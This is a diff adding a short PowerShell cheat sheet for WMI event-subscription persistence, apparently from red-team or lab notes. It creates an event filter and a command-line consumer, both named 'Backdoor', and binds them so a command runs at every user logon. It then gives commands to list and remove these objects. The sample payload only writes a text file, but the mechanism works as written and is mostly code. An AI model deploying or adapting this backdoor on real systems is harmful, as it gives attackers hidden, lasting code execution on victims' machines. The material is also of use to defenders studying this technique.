@@ -1,0 +1,47 @@
+create filter
+
+$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
+       EventNamespace = 'root/cimv2'
+       Name = "Backdoor Logon Filter"
+       Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"
+       QueryLanguage = 'WQL'
+}
+
+create consumer
+
+$command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value texttext"
+$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
+       Name = "Backdoor Consumer"
+       CommandLineTemplate = $Command
+}
+
+create binding
+
+Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{
+       Filter = $Filter
+       Consumer = $Consumer
+}
+
+list bindings
+
+Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
+
+Remove bindings
+
+Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | where name -like "*mybinding*" | Remove-WmiObject
+
+list filters
+
+Get-WmiObject -Namespace root/subscription -Class __EventFilter
+
+Remove filters
+
+Get-WmiObject -Namespace root/subscription -Class __EventFilter | where name -like "*myfilter*" | Remove-WmiObject
+
+list consumer
+
+Get-WmiObject -Namespace root/subscription -Class __EventConsumer
+
+Remove consumer
+
+Get-WmiObject -Namespace root/subscription -Class __EventConsumer | where name -like "*myconsumer*" | Remove-WmiObject
